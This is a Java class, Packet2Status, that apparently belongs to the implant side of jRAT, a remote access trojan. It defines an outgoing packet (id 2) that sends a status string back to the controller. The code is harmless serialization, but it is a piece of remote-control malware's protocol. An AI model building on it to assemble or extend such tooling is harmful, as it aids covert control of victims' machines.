package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet2Status extends AbstractOutgoingPacket {

	private String status;

	public Packet2Status(String status) {
		this.status = status;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(status);
	}

	@Override
	public byte getPacketId() {
		return (byte) 2;
	}

}
